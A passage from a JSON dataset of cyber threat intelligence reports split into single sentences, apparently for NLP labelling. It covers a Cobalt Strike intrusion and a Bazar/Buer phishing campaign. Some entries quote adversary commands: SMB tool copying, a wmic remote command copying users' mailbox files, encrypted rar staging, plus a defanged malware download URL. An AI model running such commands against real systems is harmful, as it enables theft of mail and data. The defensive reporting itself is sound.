        "line": 80,
        "index": 2113
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S81",
        "text": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "type": "",
        "report": "r-786",
        "line": 81,
        "index": 2114
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S82",
        "text": "Once the system is rebooted, the beacon is gone.",
        "type": "",
        "report": "r-786",
        "line": 82,
        "index": 2115
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S83",
        "text": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "type": "",
        "report": "r-786",
        "line": 83,
        "index": 2116
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S84",
        "text": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "type": "",
        "report": "r-786",
        "line": 84,
        "index": 2117
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S85",
        "text": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "type": "",
        "report": "r-786",
        "line": 85,
        "index": 2118
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S86",
        "text": "Maybe because it was never necessary.",
        "type": "",
        "report": "r-786",
        "line": 86,
        "index": 2119
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S87",
        "text": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "type": "",
        "report": "r-786",
        "line": 87,
        "index": 2120
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S88",
        "text": "They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack.",
        "type": "",
        "report": "r-786",
        "line": 88,
        "index": 2121
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S89",
        "text": "The adversary applied a wide range of discovery tactics.",
        "type": "",
        "report": "r-786",
        "line": 89,
        "index": 2122
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S90",
        "text": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "type": "",
        "report": "r-786",
        "line": 90,
        "index": 2123
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S91",
        "text": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "type": "",
        "report": "r-786",
        "line": 91,
        "index": 2124
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S92",
        "text": "This command exports a text file with comma separated fields.",
        "type": "",
        "report": "r-786",
        "line": 92,
        "index": 2125
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S93",
        "text": "The text files contain the contents of the Security Event log after the specified date.\n",
        "type": "",
        "report": "r-786",
        "line": 93,
        "index": 2126
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S94",
        "text": "Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).",
        "type": "",
        "report": "r-786",
        "line": 94,
        "index": 2127
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S95",
        "text": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "type": "",
        "report": "r-786",
        "line": 95,
        "index": 2128
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S96",
        "text": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "type": "",
        "report": "r-786",
        "line": 96,
        "index": 2129
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S97",
        "text": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.\n",
        "type": "",
        "report": "r-786",
        "line": 97,
        "index": 2130
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S98",
        "text": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.\n",
        "type": "",
        "report": "r-786",
        "line": 98,
        "index": 2131
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S99",
        "text": "The NtdsAudit utility is an auditing tool for Active Directory databases.",
        "type": "",
        "report": "r-786",
        "line": 99,
        "index": 2132
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S100",
        "text": "It allows the user to collect useful statistics related to accounts and passwords.",
        "type": "",
        "report": "r-786",
        "line": 100,
        "index": 2133
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S101",
        "text": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.\n",
        "type": "",
        "report": "r-786",
        "line": 101,
        "index": 2134
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S102",
        "text": "Network service scanning\n",
        "type": "",
        "report": "r-786",
        "line": 102,
        "index": 2135
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S103",
        "text": "Command used:\n",
        "type": "",
        "report": "r-786",
        "line": 103,
        "index": 2136
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S104",
        "text": "Get.exe appears to be a custom tool used to scan IP-ranges for HTTP service information.",
        "type": "",
        "report": "r-786",
        "line": 104,
        "index": 2137
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S105",
        "text": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "type": "",
        "report": "r-786",
        "line": 105,
        "index": 2138
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S106",
        "text": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "type": "",
        "report": "r-786",
        "line": 106,
        "index": 2139
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S107",
        "text": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "type": "",
        "report": "r-786",
        "line": 107,
        "index": 2140
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S108",
        "text": "GetHttpsInfo scans the internal network for HTTP HTTPS services.",
        "type": "",
        "report": "r-786",
        "line": 108,
        "index": 2141
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S109",
        "text": "The reconnaissance tool getHttpsInfo is able to discover HTTP servers within the range of a network.",
        "type": "",
        "report": "r-786",
        "line": 109,
        "index": 2142
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S110",
        "text": "The tool was shared on a Chinese forum around 2016.",
        "type": "",
        "report": "r-786",
        "line": 110,
        "index": 2143
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S111",
        "text": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "type": "",
        "report": "r-786",
        "line": 111,
        "index": 2144
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S112",
        "text": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "type": "",
        "report": "r-786",
        "line": 112,
        "index": 2145
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S113",
        "text": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "type": "",
        "report": "r-786",
        "line": 113,
        "index": 2146
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S114",
        "text": "The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim\u2019s network.",
        "type": "",
        "report": "r-786",
        "line": 114,
        "index": 2147
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S115",
        "text": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "type": "",
        "report": "r-786",
        "line": 115,
        "index": 2148
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S116",
        "text": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "type": "",
        "report": "r-786",
        "line": 116,
        "index": 2149
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S117",
        "text": "At one customer, the data of interest was stored in a separate security zone.",
        "type": "",
        "report": "r-786",
        "line": 117,
        "index": 2150
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S118",
        "text": "The adversary was able to find a dual homed system and compromise it.",
        "type": "",
        "report": "r-786",
        "line": 118,
        "index": 2151
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S119",
        "text": "From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.\n",
        "type": "",
        "report": "r-786",
        "line": 119,
        "index": 2152
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S120",
        "text": "In one event we saw the adversary compromise a Linux-system through SSH.",
        "type": "",
        "report": "r-786",
        "line": 120,
        "index": 2153
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S121",
        "text": "The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.",
        "type": "",
        "report": "r-786",
        "line": 121,
        "index": 2154
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S122",
        "text": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "type": "",
        "report": "r-786",
        "line": 122,
        "index": 2155
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S123",
        "text": "But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.",
        "type": "",
        "report": "r-786",
        "line": 123,
        "index": 2156
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S124",
        "text": "But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.",
        "type": "",
        "report": "r-786",
        "line": 124,
        "index": 2157
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S125",
        "text": "But first: How did they get the tools on the victim\u2019s systems?",
        "type": "",
        "report": "r-786",
        "line": 125,
        "index": 2158
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S126",
        "text": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "type": "",
        "report": "r-786",
        "line": 126,
        "index": 2159
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S127",
        "text": "A few examples of commands we observed:\n",
        "type": "",
        "report": "r-786",
        "line": 127,
        "index": 2160
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S128",
        "text": "copy get.exe\\\\<ip>\\c$\\windows\\temp copy msadc\\\\<hostname>\\c$\\Progra~1\\Common~1\\System\\msadc\\ copy update.ex\\\\<ip>\\c$\\windows\\temp\\ move ak002.bat\\\\<ip>\\c$\\windows\\tempup\\date.bat\n",
        "type": "",
        "report": "r-786",
        "line": 128,
        "index": 2161
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S129",
        "text": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "type": "",
        "report": "r-786",
        "line": 129,
        "index": 2162
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S130",
        "text": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "type": "",
        "report": "r-786",
        "line": 130,
        "index": 2163
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S131",
        "text": "This document was exfiltrated and used to continue the intrusion via a company portal and VPN.\n",
        "type": "",
        "report": "r-786",
        "line": 131,
        "index": 2164
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S132",
        "text": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "type": "",
        "report": "r-786",
        "line": 132,
        "index": 2165
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S133",
        "text": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:\n",
        "type": "",
        "report": "r-786",
        "line": 133,
        "index": 2166
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S134",
        "text": "wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\" copy\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost\n",
        "type": "",
        "report": "r-786",
        "line": 134,
        "index": 2167
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S135",
        "text": "Files and folders of interest are collected as well and staged for exfiltration.\n",
        "type": "",
        "report": "r-786",
        "line": 135,
        "index": 2168
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S136",
        "text": "The goal of targeting some victims appears to be to obtain data.",
        "type": "",
        "report": "r-786",
        "line": 136,
        "index": 2169
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S137",
        "text": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.\n",
        "type": "",
        "report": "r-786",
        "line": 137,
        "index": 2170
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S138",
        "text": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "type": "",
        "report": "r-786",
        "line": 138,
        "index": 2171
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S139",
        "text": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.\n",
        "type": "",
        "report": "r-786",
        "line": 139,
        "index": 2172
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S140",
        "text": "Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.",
        "type": "",
        "report": "r-786",
        "line": 140,
        "index": 2173
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S141",
        "text": "This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.",
        "type": "",
        "report": "r-786",
        "line": 141,
        "index": 2174
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S142",
        "text": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "type": "",
        "report": "r-786",
        "line": 142,
        "index": 2175
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S143",
        "text": "Most of the times the data is compressed and copied at the same time.",
        "type": "",
        "report": "r-786",
        "line": 143,
        "index": 2176
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S144",
        "text": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "type": "",
        "report": "r-786",
        "line": 144,
        "index": 2177
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S145",
        "text": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "type": "",
        "report": "r-786",
        "line": 145,
        "index": 2178
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S146",
        "text": "The filename of the command-line executable for WinRAR is RAR.exe by default.",
        "type": "",
        "report": "r-786",
        "line": 146,
        "index": 2179
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S147",
        "text": "This activity group always uses a renamed version of rar.exe.",
        "type": "",
        "report": "r-786",
        "line": 147,
        "index": 2180
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S148",
        "text": "We have observed the following filenames overlapping all intrusions:\n",
        "type": "",
        "report": "r-786",
        "line": 148,
        "index": 2181
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S149",
        "text": "- jucheck.exe\n",
        "type": "",
        "report": "r-786",
        "line": 149,
        "index": 2182
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S150",
        "text": "- RecordedTV.ms\n",
        "type": "",
        "report": "r-786",
        "line": 150,
        "index": 2183
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S151",
        "text": "- teredo.tmp",
        "type": "",
        "report": "r-786",
        "line": 151,
        "index": 2184
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S152",
        "text": "- update.exe\n",
        "type": "",
        "report": "r-786",
        "line": 152,
        "index": 2185
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S153",
        "text": "- msadcs1.exe\n",
        "type": "",
        "report": "r-786",
        "line": 153,
        "index": 2186
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S154",
        "text": "The adversary typically places the executables in the following folders:\n",
        "type": "",
        "report": "r-786",
        "line": 154,
        "index": 2187
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S155",
        "text": "- C:\\Users\\Public\\Libraries\\\n",
        "type": "",
        "report": "r-786",
        "line": 155,
        "index": 2188
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S156",
        "text": "- C:\\Users\\Public\\Videos\\",
        "type": "",
        "report": "r-786",
        "line": 156,
        "index": 2189
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S157",
        "text": "- C:\\Windows\\Temp\\",
        "type": "",
        "report": "r-786",
        "line": 157,
        "index": 2190
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S158",
        "text": "The following four different variants of the use of rar.exe as update.exe we have observed:\n",
        "type": "",
        "report": "r-786",
        "line": 158,
        "index": 2191
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S159",
        "text": "The command lines parameters have the following effect:\n",
        "type": "",
        "report": "r-786",
        "line": 159,
        "index": 2192
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S160",
        "text": "- a = add to archive.\n",
        "type": "",
        "report": "r-786",
        "line": 160,
        "index": 2193
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S161",
        "text": "- m5 = use compression level 5.\n",
        "type": "",
        "report": "r-786",
        "line": 161,
        "index": 2194
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S162",
        "text": "- r = recurse subfolders.\n",
        "type": "",
        "report": "r-786",
        "line": 162,
        "index": 2195
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S163",
        "text": "- inul = suppress error messages.\n",
        "type": "",
        "report": "r-786",
        "line": 163,
        "index": 2196
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S164",
        "text": "- hp<password> = encrypt both file data and headers with password.\n",
        "type": "",
        "report": "r-786",
        "line": 164,
        "index": 2197
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S165",
        "text": "The used password, file extensions for the staged data differ per intrusion.",
        "type": "",
        "report": "r-786",
        "line": 165,
        "index": 2198
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S166",
        "text": "We\u2019ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data.\n",
        "type": "",
        "report": "r-786",
        "line": 166,
        "index": 2199
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S167",
        "text": "After compromising a host with a Linux operating systems, data is also compressed.",
        "type": "",
        "report": "r-786",
        "line": 167,
        "index": 2200
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S168",
        "text": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "type": "",
        "report": "r-786",
        "line": 168,
        "index": 2201
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S169",
        "text": "Sometimes no file extension is used, or the file extension is .il.",
        "type": "",
        "report": "r-786",
        "line": 169,
        "index": 2202
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S170",
        "text": "Most of the times the files names are prepended with adsDL_ or contain the word \u201clist\u201d.",
        "type": "",
        "report": "r-786",
        "line": 170,
        "index": 2203
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S171",
        "text": "The files are staged in the home folder of the compromised user account: /home/<username>/\n",
        "type": "",
        "report": "r-786",
        "line": 171,
        "index": 2204
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S172",
        "text": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "type": "",
        "report": "r-786",
        "line": 172,
        "index": 2205
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S173",
        "text": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "type": "",
        "report": "r-786",
        "line": 173,
        "index": 2206
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S174",
        "text": "They switched to C2 encapsulated in HTTPS in Q3 2019.",
        "type": "",
        "report": "r-786",
        "line": 174,
        "index": 2207
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S175",
        "text": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "type": "",
        "report": "r-786",
        "line": 175,
        "index": 2208
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S176",
        "text": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "type": "",
        "report": "r-786",
        "line": 176,
        "index": 2209
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S177",
        "text": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "type": "",
        "report": "r-786",
        "line": 177,
        "index": 2210
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S178",
        "text": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "type": "",
        "report": "r-786",
        "line": 178,
        "index": 2211
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S179",
        "text": "The DNS-responses weren\u2019t logged.",
        "type": "",
        "report": "r-786",
        "line": 179,
        "index": 2212
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S180",
        "text": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "type": "",
        "report": "r-786",
        "line": 180,
        "index": 2213
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S181",
        "text": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "type": "",
        "report": "r-786",
        "line": 181,
        "index": 2214
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S182",
        "text": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "type": "",
        "report": "r-786",
        "line": 182,
        "index": 2215
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S183",
        "text": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "type": "",
        "report": "r-786",
        "line": 183,
        "index": 2216
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S184",
        "text": "The activity took place six days a week, rarely on Sundays.",
        "type": "",
        "report": "r-786",
        "line": 184,
        "index": 2217
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S185",
        "text": "The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.",
        "type": "",
        "report": "r-786",
        "line": 185,
        "index": 2218
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S186",
        "text": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "type": "",
        "report": "r-786",
        "line": 186,
        "index": 2219
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S187",
        "text": "These periods match with the Chinese Golden Week holiday.",
        "type": "",
        "report": "r-786",
        "line": 187,
        "index": 2220
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S188",
        "text": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "type": "",
        "report": "r-786",
        "line": 188,
        "index": 2221
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S189",
        "text": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "type": "",
        "report": "r-786",
        "line": 189,
        "index": 2222
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S190",
        "text": "The parent domain appspot.com is a domain owned by Google, and part of Google\u2019s App Engine platform as a service.",
        "type": "",
        "report": "r-786",
        "line": 190,
        "index": 2223
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S191",
        "text": "Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft\u2019s Azure content delivery network.",
        "type": "",
        "report": "r-786",
        "line": 191,
        "index": 2224
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S192",
        "text": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "type": "",
        "report": "r-786",
        "line": 192,
        "index": 2225
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S193",
        "text": "This is usually information containing account details.",
        "type": "",
        "report": "r-786",
        "line": 193,
        "index": 2226
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S194",
        "text": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.\n",
        "type": "",
        "report": "r-786",
        "line": 194,
        "index": 2227
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S195",
        "text": "Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.",
        "type": "",
        "report": "r-786",
        "line": 195,
        "index": 2228
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S196",
        "text": "This tool exfiltrates specified files to cloud storage web services.",
        "type": "",
        "report": "r-786",
        "line": 196,
        "index": 2229
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S197",
        "text": "The following cloud storage web services are supported by the malware:\n",
        "type": "",
        "report": "r-786",
        "line": 197,
        "index": 2230
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S198",
        "text": "- Dropbox\n",
        "type": "",
        "report": "r-786",
        "line": 198,
        "index": 2231
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S199",
        "text": "- Google Drive\n",
        "type": "",
        "report": "r-786",
        "line": 199,
        "index": 2232
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S200",
        "text": "- OneDrive\n",
        "type": "",
        "report": "r-786",
        "line": 200,
        "index": 2233
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S201",
        "text": "The actor specifies the following arguments when running the exfiltration tool:\n",
        "type": "",
        "report": "r-786",
        "line": 201,
        "index": 2234
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S202",
        "text": "- Name of the web service to be used\n",
        "type": "",
        "report": "r-786",
        "line": 202,
        "index": 2235
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S203",
        "text": "- Parameters used for the web service, such as a client ID and/or API key\n",
        "type": "",
        "report": "r-786",
        "line": 203,
        "index": 2236
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S204",
        "text": "- Path of the file to read and exfiltrate to the web service\n",
        "type": "",
        "report": "r-786",
        "line": 204,
        "index": 2237
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S205",
        "text": "We have observed the exfiltration tool in the following locations:\n",
        "type": "",
        "report": "r-786",
        "line": 205,
        "index": 2238
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S206",
        "text": "- C:\\Windows\\Temp\\msadcs.exe",
        "type": "",
        "report": "r-786",
        "line": 206,
        "index": 2239
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S207",
        "text": "- C:\\Windows\\Temp\\OneDrive.exe\n",
        "type": "",
        "report": "r-786",
        "line": 207,
        "index": 2240
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S208",
        "text": "Hashes of these files are listed at the end of this article.\n",
        "type": "",
        "report": "r-786",
        "line": 208,
        "index": 2241
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S209",
        "text": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "type": "",
        "report": "r-786",
        "line": 209,
        "index": 2242
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S210",
        "text": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:\n",
        "type": "",
        "report": "r-786",
        "line": 210,
        "index": 2243
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S211",
        "text": "- Windows event logs clearing,\n",
        "type": "",
        "report": "r-786",
        "line": 211,
        "index": 2244
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S212",
        "text": "- File deletion,\n",
        "type": "",
        "report": "r-786",
        "line": 212,
        "index": 2245
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S213",
        "text": "- Timestomping\n",
        "type": "",
        "report": "r-786",
        "line": 213,
        "index": 2246
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S214",
        "text": "An overview of the observed commands can be found in the appendix.\n",
        "type": "",
        "report": "r-786",
        "line": 214,
        "index": 2247
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S215",
        "text": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "type": "",
        "report": "r-786",
        "line": 215,
        "index": 2248
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S216",
        "text": "This tool is included in the UnxUtils repository.",
        "type": "",
        "report": "r-786",
        "line": 216,
        "index": 2249
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S217",
        "text": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "type": "",
        "report": "r-786",
        "line": 217,
        "index": 2250
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S218",
        "text": "Creating a timeline is a common thing to do for forensic analysts to get a chronological view of events on a system.",
        "type": "",
        "report": "r-786",
        "line": 218,
        "index": 2251
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S0",
        "text": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted on Google Drive or, in some cases, hosted elsewhere.",
        "type": "",
        "report": "r-787",
        "line": 0,
        "index": 2252
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S1",
        "text": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "type": "",
        "report": "r-787",
        "line": 1,
        "index": 2253
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S2",
        "text": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.\n",
        "type": "",
        "report": "r-787",
        "line": 2,
        "index": 2254
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S3",
        "text": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.\n",
        "type": "",
        "report": "r-787",
        "line": 3,
        "index": 2255
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S4",
        "text": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.\n",
        "type": "",
        "report": "r-787",
        "line": 4,
        "index": 2256
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S5",
        "text": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.\n",
        "type": "",
        "report": "r-787",
        "line": 5,
        "index": 2257
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S6",
        "text": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "type": "",
        "report": "r-787",
        "line": 6,
        "index": 2258
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S7",
        "text": "The packer used in both malware payloads is identical.",
        "type": "",
